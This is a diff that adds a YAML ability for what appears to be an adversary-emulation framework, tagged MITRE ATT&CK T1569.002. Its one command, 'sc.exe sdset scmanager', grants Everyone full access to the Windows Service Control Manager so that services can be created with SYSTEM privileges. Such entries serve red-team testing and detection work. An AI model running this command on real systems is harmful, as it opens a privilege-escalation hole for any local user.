@@ -1,0 +1,16 @@
+- description: "Modify permissions of Service Control Manager via SDSET. This allows\
+    \ any administrative user to escalate privilege and create a service with SYSTEM\
+    \ level privileges.Restart is required.\n[Blog](https://0xv1n.github.io/posts/scmanager/)\
+    \  \n"
+  id: 1240cc0b-fb3c-8ba0-e768-6925d7adca0f
+  name: Modifying ACL of Service Control Manager via SDET
+  platforms:
+    windows:
+      cmd:
+        cleanup: ''
+        command: sc.exe sdset scmanager D:(A;;KA;;;WD)
+        payloads: []
+  tactic: execution
+  technique:
+    attack_id: T1569.002
+    name: 'System Services: Service Execution'
